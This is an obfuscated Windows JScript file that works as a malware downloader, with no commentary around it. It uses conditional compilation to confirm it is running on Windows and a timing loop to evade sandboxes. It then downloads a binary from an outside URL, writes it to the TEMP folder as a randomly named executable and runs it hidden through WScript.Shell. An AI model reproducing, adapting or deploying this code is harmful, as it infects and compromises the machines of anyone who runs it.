var _ZP = false;
var _Q = "CreateObject";
var _FL = function _R() {return WScript[_Q]("WScript"+".Shell");}(), _A = 11;
var _E0 = "MSXML2.XMLHTTP";
var _XB = 2123213;
var _DD = 0;
function _G(_R2){_FL["Run"](_R2, _DD, _DD);};
function _S(){return _E0 + "";};
function _R0(_HO, _X0){_DD = _DD * 1; return _HO - _X0;};
function _E(){return _Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    _ZP = true;
  @end
@*/
if (_ZP)
{
var _G0 = "";
function _U(){return 22;};
var _ET = 0; var _E1 = 0;
function _IC()
{
var _UW = new this["Date"]();
var _W = _UW["getUTCMilliseconds"]();
WScript["Sleep"](_U());
var _UW = new this["Date"]();
var _MJ = _UW["getUTCMilliseconds"]();
WScript["Sleep"](_U());
var _UW = new this["Date"]();
var _R1 = _UW["getUTCMilliseconds"]();
var _ET = "_EJ";
_ET = _R0(_MJ, _W);
var _E1 = "_JA";
_E1 = _R0(_R1, _MJ);
_G0 = "open";
return _R0(_ET, _E1);
}
var _NT = false;
var _D = false;
for (var _WE = _DD; _WE < _U() * 1; _WE++){if (_IC() != _DD){
_NT = true; 
_E1 = "31" + 11 * _ET + _E1; 
_D = true; 
break;
}}
function _HB() {return ((_NT == true) && (_NT == _D)) ? 1 : _DD;};
if (_NT && _HB() && _D){
function _YM() {return _FL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6F3bjYsuX.ex" + "e";};
 _TM = _S();
 _L = WScript[_Q](_TM);
 var _Y0 = 1;
 while (_Y0){
try {
	if (_Y0 == 1)
	{
		_L[_G0]("GET", "http://ru-optovik.ru/j9ssl", false);
		_L["send"]();
		_G1 = "Sleep";
	}
	WScript[_G1](_U() + 120); 
	if (_L["readystate"] < 2 * 2) continue;
	_Y0 = _DD;
	function _Y(_WV) {var _X = (1, 2, 3, 4, 5, _WV); return _X;};
	_RX = WScript[_E()]("ADODB.Stream");
	_TM = _RX;
	_TM[_G0]();
	_TM["type"] = _Y(1);
	_TM["write"](_L["ResponseBody"]);
	_RX["position"] = _Y(_DD);
	_TM["Save" + "ToFile"](_YM(), 2);
	_RX["cl"+"ose"]();
	_H = _YM();
	_G(_H);
} catch(_JM){};
}
}
}

